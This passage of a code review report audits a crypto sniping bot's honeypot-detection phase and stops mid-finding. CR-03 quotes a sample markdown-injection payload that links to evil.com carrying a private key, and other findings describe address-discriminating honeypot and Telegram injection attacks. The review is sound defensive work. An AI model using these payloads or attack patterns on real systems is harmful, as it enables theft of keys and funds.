---
phase: 18-honeypot-detection-rebuild
reviewed: 2026-05-23T00:00:00Z
depth: deep
files_reviewed: 41
files_reviewed_list:
  - .env.example
  - .github/workflows/test.yml
  - .gitignore
  - README.md
  - contracts/honeypot/HoneypotChecker.sol
  - hardhat.config.ts
  - ignition/.gitignore
  - ignition/deployments/chain-1/deployed_addresses.json
  - ignition/deployments/chain-11155111/deployed_addresses.json
  - ignition/modules/HoneypotChecker.ts
  - reports/.gitkeep
  - scripts/check-mythril-report.ts
  - scripts/deploy-honeypot-checker.ts
  - src/bot.ts
  - src/chainRegistry.ts
  - src/utils/honeypot/abi.ts
  - src/utils/honeypot/bytecodeScan.ts
  - src/utils/honeypot/checkerContract.ts
  - src/utils/honeypot/index.ts
  - src/utils/honeypot/simulator.ts
  - src/utils/honeypot/types.ts
  - src/utils/tokenSafety.ts
  - test/fixtures/contracts/Honeypot.sol
  - test/fixtures/mythril/sample-clean.json
  - test/fixtures/mythril/sample-high.json
  - test/fork/fixtures/honeypots/README.md
  - test/fork/fixtures/honeypots/eth-max-wallet.json
  - test/fork/fixtures/honeypots/eth-sell-revert.json
  - test/fork/fixtures/honeypots/eth-v3-honeypot.json
  - test/fork/honeypotChecker.fork.test.ts
  - test/fork/honeypotMultiAmount.fork.test.ts
  - test/integration/honeypotDeploy.eth.test.ts
  - test/integration/honeypotDispatch.test.ts
  - test/integration/honeypotUnknownFailsClosed.test.ts
  - test/integration/v2HoneypotIntegration.test.ts
  - test/integration/v3HoneypotIntegration.test.ts
  - test/unit/bytecodeScan.test.ts
  - test/unit/chainRegistry.test.ts
  - test/unit/honeypotDispatch.test.ts
  - test/unit/honeypotTaxThreshold.test.ts
  - test/unit/honeypotTypes.test.ts
  - test/unit/safetyBank/checkHoneypotForChain.test.ts
  - test/unit/safetyBank/checkTokenMetadataForChain.test.ts
  - test/unit/safetyBank/hasHighTransferTaxForChain.test.ts
  - test/unit/safetyBank/hasMaxWalletOrTxLimitsForChain.test.ts
  - test/unit/safetyBank/isBlacklistedTokenForChain.test.ts
  - test/unit/safetyBank/isLiquidityLockedForChain.test.ts
  - test/unit/safetyBank/isLiquiditySufficientForChain.test.ts
  - test/unit/safetyBank/simulateSwapForChain.test.ts
findings:
  critical: 4
  warning: 9
  info: 7
  total: 20
status: issues_found
---

# Phase 18: Code Review Report

**Reviewed:** 2026-05-23T00:00:00Z
**Depth:** deep
**Files Reviewed:** 41
**Status:** issues_found

## Summary

Phase 18 ships the runtime wire-up of an immutable, audited `HoneypotChecker.sol` contract via a new `simulateHoneypotRoundtrip` dispatch with a 9th HONEY-12 bytecode-mutability gate added to the parallel safety bank on both V2 and V3 paths. The architecture is well-conceived (capability-split deploy key, eth_call-only revert-always contract, discriminated-union HoneypotResult with compile-gate vacuous-pass guard, fail-closed at every layer). The audit gate is correctly evergreen via `dorny/paths-filter@v3`.

However, the implementation carries **four BLOCKER defects** that have real financial-loss potential:

- **CR-01:** `simulateHoneypotRoundtrip` is dispatched BEFORE the V2 parallel safety bank but ITS RESULT IS NEVER CONSUMED IN THAT BANK — meaning the bot pays the cost of the on-chain probe gate AND the in-band gate independently, and a `verdict: 'unknown'` (e.g., null deployedAddress on BSC/Base/Arb today) silently passes through the gate (because `verdict !== 'safe'` is the unsafe check, and `'unknown'` is treated as unsafe, but the early-return blocks the buy on every BSC/Base/Arb token. See CR-01 below).
- **CR-02:** BSC/Base/Arb have `defaultHoneypotCheckerAddress: null` in CHAIN_TEMPLATES, which means EVERY V2 + V3 snipe on those three chains is hard-blocked today by the new gate, regardless of token safety. This is technically fail-closed (correct), but the README claims those chains run normally — they do not.
- **CR-03:** The wrapper's outer `try/catch` returns `verdict: 'unsafe'` with `reason: e.message` on unexpected errors. `e.message` can include user-controlled token addresses or arbitrary RPC error strings; these flow unsanitized into Telegram alert formatting, opening a markdown-injection / log-injection vector.
- **CR-04:** `_v2Sell` in `HoneypotChecker.sol` calls `IERC20(token).approve(router, received)` without checking the return value. ERC20 tokens that return `false` from `approve()` (USDT-style or malicious tokens that selectively return false on non-zero approvals) will not revert the approve call, but the subsequent `swapExactTokensForETHSupportingFeeOnTransferTokens` will fail with the router's `TRANSFER_FROM_FAILED`. This still fails-closed via the `SellFailed` revert, BUT the recorded sellTaxBps may be misleading — the failure is recorded as a sell-failed reason, not as "approve-rejected". A more pernicious case: a token that hooks `approve` to selectively succeed for the checker contract address but fail for the real bot wallet would PASS the wrapper but BLOCK the actual buy on the live wallet. See CR-04.

The phase also has multiple WARNING-level defects around tests asserting behavior that doesn't match production code (test/integration/honeypotUnknownFailsClosed.test.ts Test 5 expects `'unknown'` in the docstring but the code returns `'unsafe'`), unused imports, and untested branches.

## Critical Issues

### CR-01: bot.ts dispatches `simulateHoneypotRoundtrip` and `checkHoneypotForChain` in parallel — double-cost AND inconsistency when the chain has no deployed checker

**File:** `src/bot.ts:232` (V2) and `src/bot.ts:459` (V3)
**Issue:**
The V2 gate at line 232 calls `simulateHoneypotRoundtrip` early-out style (if `verdict !== 'safe'`, return). The V3 gate at line 459 does the same. So far, correct.

BUT a few lines later, the same handler runs a parallel safety bank that includes `checkHoneypotForChain(ctx, targetToken)` (line 262 V2, line 491 V3) — which dispatches to honeypot.is or GoPlus, a third-party HTTP API. The two paths are NEVER reconciled: the bot does its on-chain `simulateHoneypotRoundtrip` AND its honeypot.is/GoPlus `checkHoneypotForChain` redundantly on every candidate.

This is not just a wasted API call. The two gates use DIFFERENT criteria:

1. `simulateHoneypotRoundtrip` (on-chain) returns `verdict: 'unknown'` when `cfg.deployedAddress === null` (e.g., on BSC/Base/Arb today per CHAIN_TEMPLATES). The early-return at line 233 treats `'unknown'` as `!== 'safe'` and BLOCKS the buy — so every BSC/Base/Arb token is hard-blocked.
2. `checkHoneypotForChain` (third-party) might say `false` (= not a honeypot) for the same token.

If a future config-overlay accidentally sets `method: 'eth_simulateV1'` (which is the stub returning `'unknown'`), every buy on every chain is hard-blocked silently — operator sees "Honeypot gate blocked" alerts but never investigates because there's no error.

The README "Status" section at line 17 claims "the four-chain multi-DEX detection pipeline" is shipped, implying BSC/Base/Arb works. The implementation here means those chains are SILENTLY HARD-BLOCKED until plan 18-08 deploys the checker on those chains.

**Fix:**
Either:
1. Add a CHAIN_TEMPLATES validation in `buildChainRegistry()` that fails-loud on `null` `defaultHoneypotCheckerAddress` for enabled chains where `method === 'on-chain-contract'`. (`logger.fatal({ chain }, 'HoneypotChecker not deployed for enabled chain — re-run plan 18-08'); process.exit(1)`.) OR
2. Bypass the gate entirely for chains where `deployedAddress === null` (treat as deferred — but this would be a SECURITY HOLE because the gate is supposed to be mandatory). Option 1 is correct.

Additionally, drop the redundant `checkHoneypotForChain` from the parallel bank on chains where Option D is active. The third-party honeypot.is/GoPlus gate has known false-positive issues that may block legitimate snipes that the on-chain probe says are safe.

```typescript
// src/chainRegistry.ts buildChainRegistry() — add this check for enabled chains
if (isEnabled && template.honeypotMethod === 'on-chain-contract' && !honeypotCheckerAddress) {
    log.fatal(
        { chain: chainName, envVar: `${template.envPrefix}_HONEYPOT_CHECKER_ADDRESS` },
        'HoneypotChecker not deployed for enabled chain — set env var or wait for plan 18-08 deploy'
    );
    process.exit(1);
}
```

### CR-02: V2 dispatch type-narrowing accepts non-V2 `DexConfig` and falls through to `verdict: 'unknown'`

**File:** `src/utils/honeypot/checkerContract.ts:242-248`, `src/utils/honeypot/index.ts:59-64`
**Issue:**
`simulateViaContractV2(ctx, dex, token, deployedAddress)` accepts `dex: DexConfig` (union of V2 + V3). At line 242 it checks `if (dex.dexType !== 'v2')` and returns `'unknown'` with a `dispatch-mismatch` reason. But the dispatch in `index.ts` at line 59 only invokes V2 when `dex.dexType === 'v2'`. So the V2 wrapper's runtime check is defensive against direct invocation — fine.

However, there's a logic gap in `index.ts`:
```typescript
if (cfg.method === 'on-chain-contract') {
    if (!cfg.deployedAddress) { return unknown; }
    if (dex.dexType === 'v2') { return simulateViaContractV2(...); }
    if (dex.dexType === 'v3') { return simulateViaContractV3(...); }
}
// falls through to next check — bug if dex.dexType is unrecognized
if (cfg.method === 'eth_simulateV1') { return simulateViaSimulator(...); }
// fall through to final return
return { verdict: 'unknown', reason: `bad-method:${String(cfg.method)}`, ... };
```

If `cfg.method === 'on-chain-contract'` and `cfg.deployedAddress` is set but `dex.dexType` is neither `'v2'` nor `'v3'` (e.g., a future `'v4'` variant), the code falls through to the final return with reason `bad-method:on-chain-contract`. This is technically `'unknown'` (fail-closed, good), but the diagnostic info is wrong — the method was valid, the dex type wasn't.

More importantly: there's NO exhaustive `never` check on `dex.dexType`. The README claims the codebase uses "Discriminated-union chain and DEX abstractions" with "exhaustive `never`-checks at every dispatch site" (README:126). This dispatch site violates that principle.

**Fix:**
Add explicit exhaustive narrowing:
```typescript
if (cfg.method === 'on-chain-contract') {
    if (!cfg.deployedAddress) {
        return { verdict: 'unknown', reason: 'no-deployed-address', evidence: { method: 'on-chain-contract', dexType: dex.dexType } };
    }
    switch (dex.dexType) {
        case 'v2':
            return simulateViaContractV2(ctx, dex, token, cfg.deployedAddress);
        case 'v3':
            return simulateViaContractV3(ctx, dex, token, cfg.deployedAddress, feeTier ?? 3000);
        default: {
            const _exhaustive: never = dex;
            return { verdict: 'unknown', reason: `unknown-dex-type:${String((_exhaustive as DexConfig).dexType)}`, evidence: { method: 'on-chain-contract' } };
        }
    }
}
```

### CR-03: Unsanitized error message flows into Telegram markdown alert — markdown / log injection vector

**File:** `src/utils/honeypot/checkerContract.ts:289` and `:372`, `src/bot.ts:251` and `:479`
**Issue:**
The outer catch in `simulateViaContractV2` (line 282-292) and `simulateViaContractV3` (line 365-375) does:
```typescript
return {
    verdict: 'unsafe',
    reason: e instanceof Error ? e.message : String(e),
    evidence: { method: 'on-chain-contract', dexType: 'v2' },
};
```

The `reason` field flows into the V2 alert at bot.ts:251:
```typescript
await sendCtxAlert(
    ctx,
    `*SKIP* \`${targetToken}\` -- ${honeypotResult.verdict} (${honeypotResult.reason})${taxInfo}\n[Etherscan](${ctx.chain.explorerUrl}/token/${targetToken})`
);
```

`honeypotResult.reason` is interpolated directly into a Telegram markdown message WITHOUT escaping. An attacker who can influence the RPC error message (e.g., by deploying a token whose contract execution emits a custom revert string designed to break markdown — `Error: oops*MORE*spam[FAKE](http://evil.com/${private_key})`) can:
1. Inject markdown formatting that breaks the alert layout
2. Inject `[link text](url)` links that exfiltrate data via URL parameters
3. Inject content that looks like the bot's own log lines for confusion

Combined with the inbound Telegram listener (TELEGRAM_ALLOWED_SENDERS empty by default, accepts any sender), an attacker who can spoof an "alpha drop" alert can feed crafted addresses through the bot, observe the SKIP alerts in their own channel, and harvest sensitive context.

The injection is also propagated into the dashboard WebSocket via the alert fan-out (see README:96, "Every Telegram alert is also broadcast to the dashboard WebSocket as a `notification` event"), where the operator's browser will render it.

**Fix:**
Sanitize `reason` before interpolation:
```typescript
function sanitizeReason(reason: string): string {
    // Strip markdown special chars + truncate to 120 chars
    return reason.replace(/[`*_\[\]()\\]/g, '').slice(0, 120);
}
```

Apply at the alert-format sites (bot.ts:251, bot.ts:479) and also in the wrapper's catch so the JSON-logged reason doesn't carry arbitrary RPC strings into log aggregators.

Separately, also clamp `evidence.revertReason` (line 170 in checkerContract.ts) which flows into the same alerts.

### CR-04: `HoneypotChecker._v2Sell` does not check `IERC20.approve` return value — token with selective-approve bypass passes the gate

**File:** `contracts/honeypot/HoneypotChecker.sol:173`
**Issue:**
```solidity
function _v2Sell(...) private returns (uint sellTaxBps, uint8 status) {
    status = statusIn;
    IERC20(token).approve(router, received);  // <-- no return-value check
```

OpenZeppelin's `IERC20.approve` returns `bool`. A malicious token can:
1. Return `false` from `approve(checkerAddress, ...)` (which the wrapper ignores, so the V2 sell call would fail with `TRANSFER_FROM_FAILED`, which is caught as `SellFailed("TRANSFER_FROM_FAILED")` — fail-closed at the wrapper. OK.
2. **(Critical attack):** Implement `approve` to selectively return `true` and actually grant allowance when `msg.sender` is the audited HoneypotChecker contract address (a known constant `0x8243dBeA5caD296B9e72a6ed557D7E0fEBee13eD`) but return `false` / not grant allowance when `msg.sender` is the bot wallet. The wrapper sees a successful sell roundtrip and reports `verdict: 'safe'`. The real buy proceeds. When the bot tries to sell, the token's `approve` returns false (or the swap fails). The bot is now stuck holding tokens that cannot be sold.

The `from: ctx.wallet.address` PITFALLS #4 mitigation does NOT help here because `msg.sender` inside `_v2Sell` is `address(this)` (the HoneypotChecker contract), not `ctx.wallet.address`. So the malicious token can EASILY distinguish "this is the audit-time probe" from "this is the live snipe" by reading `msg.sender` in its `approve` hook.

This is the modern "address-discriminating honeypot" pattern, which became prevalent in 2025. The contract is "audited" by Slither + Mythril, but neither tool detects this class of attack — it requires modeling adversarial-token state across two distinct caller identities, which is outside both tools' scope.

The V3 sell at line 323 has the same defect:
```solidity
IERC20(token).approve(swapRouter, received);
```

**Fix:**
Two-tier mitigation:

1. **Solidity-side:** Use SafeERC20 + simulate the live wallet's address explicitly:
```solidity
import {SafeERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";

using SafeERC20 for IERC20;

// In _v2Sell:
IERC20(token).safeApprove(router, 0);  // Some tokens require 0-then-N
IERC20(token).safeApprove(router, received);
```

`SafeERC20.safeApprove` reverts if `approve` returns `false`, eliminating the silent-success path. (Note: `safeApprove` was deprecated in OZ 5.x in favor of `forceApprove` / `safeIncreaseAllowance`. Use `forceApprove(router, received)`.)

2. **Wrapper-side (long-term):** Pass the bot wallet's address as an additional argument to the checker contract, and have the contract do `delegateCall` to a proxy that sets `msg.sender == botWallet` during the probe (or use `eth_call` with `from: botWallet` directly — which is what the wrapper already does for the OUTER `provider.call`, but the inner `approve` is `msg.sender == checkerContract`). Address-discriminating honeypots are unfortunately unavoidable at the wrapper layer; the only durable defense is to monitor for sells failing post-buy and quickly close such positions before the price drains via tax (Phase 19 anti-rug runtime monitoring).

Add a comment to `HoneypotChecker.sol` documenting this known limitation: the `msg.sender` inside the checker is the contract itself, not the bot wallet, so an address-discriminating honeypot can bypass the gate. The downstream mitigation is the bytecode mutability scan (HONEY-12) plus the runtime anti-rug monitor.

## Warnings

### WR-01: Tests assert `verdict !== 'safe'` instead of asserting the precise verdict — vacuous test coverage

**File:** `test/integration/honeypotUnknownFailsClosed.test.ts:83`, `:97`
**Issue:**
Test 5 docstring claims:
> "V2 provider.call RESOLVES (no revert — contract bug) → unknown with reason no-terminal-revert"

But the actual assertion is `expect(result.verdict).not.toBe('safe')` (line 83). The code path actually returns `verdict: 'unsafe'` (because `aggregateProbes` treats all-gating-probes-`ok:false` as `'unsafe'`, not `'unknown'`). The test passes either way, but the docstring is misleading — and worse, the test gives false confidence that the `'unknown'` semantic is verified when it isn't.

A future refactor that accidentally changes `verdict: 'unsafe'` to `verdict: 'safe'` for this case would fail the test (good). But a refactor that changes it to `verdict: 'unknown'` would also pass — which masks important behavioral changes.

The same pattern appears in `test/fork/honeypotChecker.fork.test.ts:237` (`expect(result.verdict).not.toBe('safe')`) for the contrived V2 modes — this is acknowledged in the file comment (line 111-118), but it weakens the test contract.

**Fix:**
Tighten the assertion to the actual expected verdict:
```typescript
expect(result.verdict).toBe('unsafe');
if (result.verdict === 'unsafe') {
    // For Test 5, the reason should be 'no-terminal-revert' on all gating probes
    expect(result.reason).toMatch(/no-terminal-revert/);
}
```

If the docstring's "unknown" intent is correct, change the production code to return `'unknown'` for `no-terminal-revert` and update the aggregation logic.

### WR-02: Dead code — `pair.token1()` called for side-effect only

**File:** `src/utils/tokenSafety.ts:430-433`
**Issue:**
```typescript
const [token0] = await Promise.all([
    pair.token0(),
    pair.token1()
]);
```

`token1` is destructured-out but the `pair.token1()` Promise IS awaited (because Promise.all awaits both). The result is discarded. Either:
1. Drop the `pair.token1()` call entirely (saves one RPC round-trip per liquidity check), OR
2. Use both values (some code in the codebase reads both: see line 169 same file).

The same dead-call pattern exists at line 169-172 but with both values destructured (`const [token0, token1]`), which is correct usage. Line 430 looks like a partial refactor that dropped `token1` usage but left the RPC call.

**Fix:**
```typescript
const token0 = await pair.token0();
```

### WR-03: README claims Phase 18 is "in progress" but plan 18-09 + 18-10 wiring landed — README stale

**File:** `README.md:17`, `:113`, `:305`, `:433`
**Issue:**
README says throughout:
- Line 17: "the runtime wire-up at `src/bot.ts:229` and the real `checkerContract.ts` adapter implementations are pending plan 18-09"
- Line 113: "**Status: In Progress** — runtime wire-up at `src/bot.ts:229` ... are pending plan 18-09"
- Line 305: "Today's state: the contract is audited and the CI gate is live ... but is not yet called from `src/bot.ts:229`"
- Line 433: "Runtime wire-up at `src/bot.ts:229` ... are pending plan 18-09. ... **Status: In Progress.**"

But the actual `src/bot.ts:228-271` DOES dispatch `simulateHoneypotRoundtrip` and runs `isMutableTokenForChain` in the parallel bank. The `checkerContract.ts` placeholder is GONE — `simulateViaContractV2` and `simulateViaContractV3` are real implementations. The work is shipped, not in-progress.

This is a documentation bug, not a runtime defect, but it's significant for operator trust: an operator reading the README sees "in progress" and may believe the gate isn't live, then trade with unsafe assumptions about which guards are active.

**Fix:**
Update the README to reflect that plan 18-09 + 18-10 landed:
- Line 17: "the audit-once-deploy-once `HoneypotChecker.sol` is live on Ethereum and ETH snipes are gated by it; BSC/Base/Arb deploys are pending plan 18-08."
- Line 113: Change "**Status: In Progress**" → "**Status: Shipped on ETH; Other chains pending 18-08**"
- Line 433: Same correction in the In-Progress Work section.

### WR-04: `_v2Sell` reads `ethBefore = address(this).balance` immediately after the V2 buy — non-deterministic if buy refund is non-zero

**File:** `contracts/honeypot/HoneypotChecker.sol:181`
**Issue:**
After the V2 `swapExactETHForTokens{value: amountIn}` call (line 144), the router may refund leftover ETH to `address(this)` (via the contract's `receive() external payable {}` at line 361). This is documented in the contract comment at line 358-360. So at line 181 (`ethBefore = address(this).balance`), the balance might be non-zero (a small refund) — the subtraction `ethAfter - ethBefore` at line 196 SHOULD correctly compute the net ETH received from the sell.

BUT: if the receive() function were ever to revert (it doesn't, but if a future change adds logic), the buy's refund would silently fail and `ethBefore` would be wrong. More immediately, the `expectedEthOut > receivedEth` tax calc at line 197-199 uses `receivedEth = ethAfter - ethBefore`. If `ethBefore` includes a router-refund (say 1 wei due to rounding), the computed sell tax is slightly understated. Not exploitable, but the precision is suspect.

**Fix:**
Either:
1. Explicitly track sell-only ETH delta by capturing balance *after* the buy refund (a clear baseline) — but this is what `ethBefore` already does. The risk is small.
2. Drain the contract's ETH balance to zero between buy and sell as an explicit invariant:
```solidity
// Reset baseline before sell to make ethBefore deterministic at 0
require(address(this).balance == 0 || ... , "...");
```

This is a minor concern, but worth a comment in the contract documenting that `ethBefore` may include the V2 router's refund and that the subtraction at line 196 is correct only because the refund is constant across the buy + sell legs.

### WR-05: `checkerContract.ts` outer try/catch swallows distinct error types — `unsafe` may mask `unknown`

**File:** `src/utils/honeypot/checkerContract.ts:282-292`, `:365-375`
**Issue:**
The outer try/catch returns `verdict: 'unsafe'` on ANY thrown error, including:
1. `ethers.parseEther(ctx.chain.snipeAmount)` throwing `InvalidArgumentError` if `snipeAmount` is malformed (e.g., `"abc"`).
2. `iface.encodeFunctionData(...)` throwing if `token` or `routerAddress` is not a valid address.
3. A truly unexpected JS-level error (TypeError, etc.).

Cases 1 and 2 indicate CONFIG BUGS, not unsafe tokens. Returning `verdict: 'unsafe'` for a config bug means the operator sees a "honeypot detected" alert for every token — not a hint that the bot is misconfigured. The proper diagnostic is `'unknown'` with a config-bug reason.

This contradicts D-UNKNOWN-POLICY which says `'unknown'` is the policy for "we cannot determine, skip without retry". A config bug is precisely that case.

**Fix:**
Differentiate ProbeOutcome failures (which are correctly `'unsafe'`) from wrapper-level config bugs (which should be `'unknown'`):
```typescript
try {
    // ... probe loop
} catch (e: unknown) {
    // ParseError on snipeAmount, encodeFunctionData on bad address — config bugs.
    // These are NOT unsafe-token evidence; they're "the gate could not run".
    const isConfigBug = e instanceof Error && (
        e.message.includes('parseEther') ||
        e.message.includes('encodeFunctionData') ||
        e.message.includes('INVALID_ARGUMENT')
    );
    return {
        verdict: isConfigBug ? 'unknown' : 'unsafe',
        reason: e instanceof Error ? sanitizeReason(e.message) : String(e),
        evidence: { method: 'on-chain-contract', dexType: 'v2' },
    };
}
```

Note: this STILL fail-closes the buy in bot.ts (since `verdict !== 'safe'`). The benefit is operator diagnostics.

### WR-06: HoneypotChecker.sol's `checkV2` and `checkV3` are `external payable` with no reentrancy guard despite calling untrusted token's `approve`

**File:** `contracts/honeypot/HoneypotChecker.sol:114`, `:215`
**Issue:**
`checkV2` and `checkV3` are `external payable` and call `IERC20(token).approve(router, received)` at line 173 / 323. The token contract is fully attacker-controlled. The token's `approve` (or its `transfer`/`transferFrom` later in the sell) could reenter `checkV2` / `checkV3` via a callback.

The contract is documented "stateless" but it does have implicit state during a transaction: `address(this).balance`, `IERC20(token).balanceOf(address(this))`, allowances. A reentrant call could:
1. Re-enter `checkV2` mid-execution. Since `msg.value` would be 0 on reentry (no new value sent), the `require(msg.value == amountIn)` check would catch this (line 115). OK so far.
2. Re-enter via an internal call by manipulating `block.timestamp` (via a malicious `block.timestamp` mock?) — no, attackers can't control `block.timestamp` directly.
3. Re-enter via the `receive() external payable {}` function. The router refunds ETH, which calls receive(). If receive() were to invoke checkV2 recursively (it doesn't today, but a future change could), reentrancy would matter.

The Mythril + Slither audit dispositioned reentrancy findings as "false-positive against eth_call-only revert-always design" per README:110. This disposition is TRUE only because the contract always reverts — so the state changes don't persist. But within a single transaction execution, reentrancy CAN affect the path taken (e.g., `balanceOf` returning a manipulated value mid-execution).

For example: a token's `approve` could call back into the contract via the receive() (sending some ETH), which currently does nothing. But if a future operator extends receive() to do anything stateful, the reentrancy vector is live.

**Fix:**
Add `nonReentrant` modifier (OpenZeppelin's `ReentrancyGuard`) to `checkV2` and `checkV3`. Since the contract always reverts at the end, the lock would never actually be released, but the in-transaction reentrancy lock is the standard defense. The added bytecode and gas are minimal.

Alternatively, document explicitly in the contract that reentrancy is structurally impossible because (a) all state changes are reverted, (b) `receive()` is empty, and (c) future maintainers must not add state-mutating logic to receive(). This is the "manual invariant" path — risky but acceptable for a frozen contract.

### WR-07: `bot.ts:370` logs "TX confirmed" before the transaction is actually confirmed

**File:** `src/bot.ts:369-371`
**Issue:**
```typescript
await sendCtxAlert(ctx, `*Buy TX sent via ${ctx.chain.mevStrategy}* for \`${symbol}\``);
ctx.log.info({ token: targetToken, symbol, strategy: ctx.chain.mevStrategy }, 'MEV bundle submitted');
ctx.log.info({ token: targetToken }, 'TX confirmed');  // <-- WRONG
await sendCtxAlert(ctx, `*TX confirmed* for \`${symbol}\``);
```

`sendTxWithRetry` returns `Promise<string | void>` — it returns the tx hash on success but doesn't wait for the transaction to be mined / confirmed (depending on the MEV strategy). The "TX confirmed" log/alert fires immediately after submission, not after on-chain confirmation. An operator seeing "TX confirmed" might believe the trade settled successfully; the actual settlement status is in the `trades` table with `status: 'pending'` until receipt-decoded.

The V3 path has the same pattern at line 596-597.

This is a pre-existing issue (not introduced by Phase 18), but it's still in the changed file. Per the review scope, calling it out.

**Fix:**
Drop the "TX confirmed" lines, or only emit them after actual confirmation:
```typescript
const txHash = await sendTxWithRetry(...);
ctx.log.info({ token: targetToken, txHash }, 'MEV bundle submitted');

// Don't log "TX confirmed" until receipt is decoded.
// The exit engine + receipt decoder handle the actual confirmation flow.
```

### WR-08: `deploy-honeypot-checker.ts` does not check that bot's PRIVATE_KEY isn't reused as DEPLOY_PRIVATE_KEY

**File:** `scripts/deploy-honeypot-checker.ts:62-67`
**Issue:**
The script checks `DEPLOY_PRIVATE_KEY` is set but does NOT check that it's distinct from `PRIVATE_KEY`. An operator who copy-pastes from `.env.example` and uses the same key for both (a common mistake) would silently bypass the D-DEPLOY-KEY capability split. The comment block describes the importance of the split but the code doesn't enforce it.

**Fix:**
```typescript
if (!process.env.DEPLOY_PRIVATE_KEY) {
    log.fatal('DEPLOY_PRIVATE_KEY env var required. ...');
    process.exit(1);
}
if (process.env.PRIVATE_KEY && process.env.DEPLOY_PRIVATE_KEY === process.env.PRIVATE_KEY) {
    log.fatal(
        'DEPLOY_PRIVATE_KEY must be DISTINCT from PRIVATE_KEY per D-DEPLOY-KEY capability split. ' +
        'If the bot wallet leaks, the attacker must NOT be able to deploy malicious checkers.'
    );
    process.exit(1);
}
```

### WR-09: Inbound Telegram listener default allows all senders + channels — combined with WR-03 stale README this is a real attack surface

**File:** `.env.example:50-51`, observed pattern documented at `README.md:101`
**Issue:**
```dotenv
TELEGRAM_ALLOWED_SENDERS=             # [OPTIONAL] Comma-separated allowed sender IDs (empty = allow all)
TELEGRAM_ALLOWED_CHANNELS=            # [OPTIONAL] Comma-separated allowed channel/group IDs (empty = allow all)
```

Default behavior on empty is "allow all". Combined with CR-03's markdown-injection vulnerability, an attacker who joins any group the bot's MTProto session is in can:
1. Post a crafted Telegram message with `0xABC...` addresses where ABC encodes a malicious payload in the revert message (deploys a token whose contract `revert` includes markdown-injecting strings).
2. The bot processes the address, detects it as unsafe via `simulateHoneypotRoundtrip`, and emits a SKIP alert containing the unsanitized revert message.
3. The alert is rendered in the operator's Telegram chat AND the operator's dashboard, executing markdown injection.

While Phase 18 doesn't change the Telegram listener, the combination of CR-03 (Phase 18) + this pre-existing wide-open default = exploitable.

**Fix:**
Change the default behavior to "reject all" if empty, and require explicit `*` (wildcard) to opt-into "allow all":
```typescript
// In telegramListener.ts (not Phase 18 scope but flagged for tracking)
const allowAllSenders = process.env.TELEGRAM_ALLOWED_SENDERS === '*';
const allowedSenders = new Set((process.env.TELEGRAM_ALLOWED_SENDERS || '').split(',').filter(Boolean));

if (allowedSenders.size === 0 && !allowAllSenders) {
    log.fatal('TELEGRAM_ALLOWED_SENDERS required. Set to "*" to allow all (NOT recommended) or a comma-separated allowlist.');
    process.exit(1);
}
```

## Info

### IN-01: `MUTABLE_SELECTORS` table includes selectors with collision risk

**File:** `src/utils/honeypot/bytecodeScan.ts:40-60`
**Issue:**
The 4-byte selectors (e.g., `'2e5bb6ff'` for `setTax(uint256)`) are substring-matched against the full bytecode. A 4-byte sequence has a 1/4 billion collision rate per random 4-byte window — and Solidity bytecode contains many random-looking 4-byte windows (constants, immutables, jump destinations, function dispatch tables). A legitimate token with no setTax functionality could legitimately contain the bytes `2e 5b b6 ff` somewhere in its code, producing a false-positive HONEY-12 block.

Probability per 19-selector table × ~10KB typical bytecode ≈ 19 × 10000 / 2^32 ≈ 0.004% per token. Over the bot's lifetime (potentially thousands of detections), expect a handful of false-positives that block legitimate snipes.

**Fix:**
Match against the function dispatch table specifically (the first ~1KB of bytecode), not the entire bytecode. The function dispatch table is the only place where selectors are guaranteed to appear in non-random positions.

Alternatively (more conservative), require that the selector be aligned to a 1-byte boundary AND followed by `EQ JUMP` (`14 57`) — the canonical Solidity dispatch pattern. This drops false-positive rate to near-zero.

For now, document the false-positive rate in the file header so an operator who sees a HONEY-12 block on a "good-looking" token knows to inspect the bytecode manually.

### IN-02: `checkerContract.ts` makes 3 probe calls in parallel — RPC rate-limit risk

**File:** `src/utils/honeypot/checkerContract.ts:273`, `:356`
**Issue:**
```typescript
const probeOutcomes = await Promise.all(amounts.map(runProbeV2));
```

Three `provider.call` invocations in parallel for every candidate token. Multiplied across V2 + V3 paths and the existing safety bank's 9 calls, a single token detection now triggers 21+ RPC calls. On free-tier Alchemy / Infura plans this can blow through rate limits during a launch surge.

The README doesn't mention an RPC plan minimum. The runbook should specify the expected RPC budget.

**Fix:**
Either sequence the probes (1% first, then 50%, then 100% only if smaller probes pass) for fewer total calls, OR document the RPC plan minimum in `GOING-LIVE.md` (e.g., "requires paid Alchemy tier with 100 CU/sec per chain").

### IN-03: `eth-v3-honeypot.json` has `tokenAddress: null` — fork test silently skips

**File:** `test/fork/fixtures/honeypots/eth-v3-honeypot.json:4`, `test/fork/honeypotChecker.fork.test.ts:264`
**Issue:**
The V3 fork test fixture has `tokenAddress: null` and `forkBlockNumber: null`. The fork test silently skips (with a console.warn) when these are null. The contrived V3 dispatch test (line 340-405) does exercise the V3 dispatcher, but only against a synthetic Honeypot.sol with no V3 pool — proving the dispatch path is wired but not proving the V3 contract correctly identifies a real V3 honeypot.

This is acknowledged in the README at line 142 of the fixture directory ("the fork suite is not blocked on these resolutions") but it's still a coverage gap. There is no real-mainnet V3 honeypot fixture exercising the full V3 sell path.

**Fix:**
Tracked under the fixture directory's "Outstanding Block-Pin Verification" table. The Wave-1 follow-up task is correctly scoped; no code change needed beyond completing that task.

### IN-04: Hardcoded `feeTier = 3000` default in dispatcher

**File:** `src/utils/honeypot/index.ts:63`
**Issue:**
```typescript
return simulateViaContractV3(ctx, dex, token, cfg.deployedAddress, feeTier ?? 3000);
```

The default `3000` (0.3%) is the most common V3 fee tier but not the only one. The README mentions tiers `[500, 3000, 10000]`. If a caller omits `feeTier` and the actual pool is a 0.05% (500) or 1% (10000) tier, the simulation runs against a non-existent pool at 0.3%, the quoter reverts, and the gate returns `'unsafe'` via `quote-failed`. The token is blocked despite being legitimate.

In practice, bot.ts:459 ALWAYS supplies the runtime feeTier, so this default is only hit by direct callers (tests). But documenting via type-system better:

**Fix:**
Either make `feeTier` mandatory in the V3 dispatch (drop the default), or have the dispatch try all three fee tiers in sequence and return safe only if any pool is safe. Mandatory is cleaner:
```typescript
if (dex.dexType === 'v3') {
    if (feeTier === undefined) {
        return { verdict: 'unknown', reason: 'v3-dispatch-missing-feeTier', ... };
    }
    return simulateViaContractV3(ctx, dex, token, cfg.deployedAddress, feeTier);
}
```

### IN-05: `simulator.ts` is a stub but exports a real function — caller cannot detect "stubbed"

**File:** `src/utils/honeypot/simulator.ts:16-26`
**Issue:**
